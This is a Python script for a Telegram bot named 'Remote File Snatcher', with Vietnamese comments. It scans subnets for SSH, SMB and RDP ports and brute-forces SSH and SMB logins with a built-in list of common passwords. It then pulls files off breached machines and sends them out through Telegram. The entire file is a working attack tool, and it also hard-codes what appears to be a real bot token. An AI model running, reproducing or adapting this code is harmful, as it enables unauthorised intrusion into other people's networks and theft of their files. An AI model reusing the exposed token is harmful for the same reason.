#!/usr/bin/env python3
# Bot Telegram - Remote File Snatcher
# Token của bạn: 8702411893:AAELXd_JyPwmv9J9HFE1Z582Xsz9XEwexEY

import os, sys, socket, ipaddress, tempfile, threading, time, asyncio
try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
except ImportError:
    print("Cài: pip install python-telegram-bot")
    sys.exit(1)
try:
    import paramiko
except ImportError:
    paramiko = None
try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    SMBConnection = None

TOKEN = "8702411893:AAELXd_JyPwmv9J9HFE1Z582Xsz9XEwexEY"   # hoặc os.getenv("BOT_TOKEN")
WORDLIST = ["admin","password","123456","root","user","test","guest","P@ssw0rd","password123"]
TIMEOUT = 2
SCAN_THREADS = 50

# ---------- CÁC HÀM QUÉT/BRUTE/TẢI (giữ nguyên từ code trước) ----------
def scan_ports(ip, ports):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            s.close()
        except:
            pass
    return open_ports

def scan_subnet(subnet, ports=[22,445,3389,139]):
    results = []
    try:
        net = ipaddress.ip_network(subnet, strict=False)
        hosts = list(net.hosts())
        def worker(host):
            ip = str(host)
            p = scan_ports(ip, ports)
            if p:
                results.append((ip, p))
        threads = []
        for host in hosts:
            t = threading.Thread(target=worker, args=(host,))
            t.start()
            threads.append(t)
            if len(threads) >= SCAN_THREADS:
                for t in threads: t.join()
                threads = []
        for t in threads: t.join()
    except Exception as e:
        return str(e)
    return results

def brute_ssh(ip, username):
    if paramiko is None: return None
    for pwd in WORDLIST:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=pwd, timeout=TIMEOUT+1)
            client.close()
            return pwd
        except:
            continue
    return None

def get_file_ssh(ip, user, pwd, remote, local):
    if paramiko is None: return False
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=user, password=pwd, timeout=5)
        sftp = client.open_sftp()
        sftp.get(remote, local)
        sftp.close(); client.close()
        return True
    except:
        return False

def brute_smb(ip, username=""):
    if SMBConnection is None: return None
    users = [username] if username else ["", "guest", "admin", "Administrator"]
    for user in users:
        for pwd in WORDLIST:
            try:
                conn = SMBConnection(ip, ip, timeout=TIMEOUT)
                conn.login(user, pwd)
                conn.close()
                return (user, pwd)
            except:
                pass
    return None

def get_file_smb(ip, user, pwd, remote, local):
    if SMBConnection is None: return False
    try:
        conn = SMBConnection(ip, ip, timeout=TIMEOUT)
        conn.login(user, pwd)
        if remote.startswith('\\\\'):
            parts = remote[2:].split('\\', 1)
            share, path = parts[0], parts[1].replace('\\','/')
        else:
            parts = remote.split('/', 1)
            share, path = parts[0], parts[1] if len(parts)>1 else ''
        with open(local, 'wb') as f:
            conn.getFile(share, path, f.write)
        conn.close()
        return True
    except:
        return False

# ---------- CÁC HÀM XỬ LÝ LỆNH BOT ----------
async def start(update, context):
    await update.message.reply_text(
        "🤖 Remote File Snatcher\n"
        "/scan <subnet>\n/brutessh <ip> <user>\n/getssh <ip> <user> <pass> <path>\n"
        "/brutesmb <ip>\n/getsmb <ip> <user> <pass> <share/path>"
    )

async def scan_cmd(update, context):
    args = context.args
    if not args:
        await update.message.reply_text("VD: /scan 192.168.1.0/24")
        return
    subnet = args[0]
    await update.message.reply_text(f"⏳ Đang quét {subnet}...")
    loop = asyncio.get_event_loop()
    res = await loop.run_in_executor(None, scan_subnet, subnet)
    if isinstance(res, str):
        await update.message.reply_text(f"Lỗi: {res}"); return
    if not res:
        await update.message.reply_text("Không tìm thấy.")
        return
    msg = "📡 Kết quả:\n"
    for ip, ports in res:
        msg += f"{ip} - Mở: {ports}\n"
        if len(msg) > 4000:
            await update.message.reply_text(msg); msg = ""
    if msg: await update.message.reply_text(msg)

async def brutessh_cmd(update, context):
    args = context.args
    if len(args)<2:
        await update.message.reply_text("Cú pháp: /brutessh <ip> <username>")
        return
    ip, user = args[0], args[1]
    await update.message.reply_text(f"⏳ Brute SSH {ip}:{user}...")
    loop = asyncio.get_event_loop()
    pwd = await loop.run_in_executor(None, brute_ssh, ip, user)
    if pwd:
        await update.message.reply_text(f"✅ Mật khẩu: `{pwd}`", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Không tìm thấy.")

async def getssh_cmd(update, context):
    args = context.args
    if len(args)<4:
        await update.message.reply_text("Cú pháp: /getssh <ip> <user> <pass> <path>")
        return
    ip, user, pwd, remote = args[0], args[1], args[2], " ".join(args[3:])
    with tempfile.NamedTemporaryFile(delete=False, suffix='.download') as tmp:
        local = tmp.name
    await update.message.reply_text(f"⏳ Đang tải {remote}...")
    loop = asyncio.get_event_loop()
    ok = await loop.run_in_executor(None, get_file_ssh, ip, user, pwd, remote, local)
    if ok:
        with open(local, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(remote))
        os.unlink(local)
    else:
        await update.message.reply_text("❌ Tải thất bại.")
        if os.path.exists(local): os.unlink(local)

async def brutesmb_cmd(update, context):
    args = context.args
    if not args:
        await update.message.reply_text("Cú pháp: /brutesmb <ip>")
        return
    ip = args[0]
    await update.message.reply_text(f"⏳ Brute SMB {ip}...")
    loop = asyncio.get_event_loop()
    cred = await loop.run_in_executor(None, brute_smb, ip)
    if cred:
        user, pwd = cred
        await update.message.reply_text(f"✅ Tìm thấy: `{user}:{pwd}`", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Không tìm thấy.")

async def getsmb_cmd(update, context):
    args = context.args
    if len(args)<4:
        await update.message.reply_text("Cú pháp: /getsmb <ip> <user> <pass> <share/path>")
        return
    ip, user, pwd, remote = args[0], args[1], args[2], " ".join(args[3:])
    with tempfile.NamedTemporaryFile(delete=False, suffix='.download') as tmp:
        local = tmp.name
    await update.message.reply_text(f"⏳ Đang tải {remote}...")
    loop = asyncio.get_event_loop()
    ok = await loop.run_in_executor(None, get_file_smb, ip, user, pwd, remote, local)
    if ok:
        with open(local, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(remote))
        os.unlink(local)
    else:
        await update.message.reply_text("❌ Tải thất bại.")
        if os.path.exists(local): os.unlink(local)

async def help_cmd(update, context):
    await start(update, context)

# ---------- MAIN ----------
def main():
    if paramiko is None: print("⚠️ paramiko chưa cài")
    if SMBConnection is None: print("⚠️ impacket chưa cài")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("scan", scan_cmd))
    app.add_handler(CommandHandler("brutessh", brutessh_cmd))
    app.add_handler(CommandHandler("getssh", getssh_cmd))
    app.add_handler(CommandHandler("brutesmb", brutesmb_cmd))
    app.add_handler(CommandHandler("getsmb", getsmb_cmd))
    print("🤖 Bot đang chạy...")
    app.run_polling()

if __name__ == "__main__":
    main()
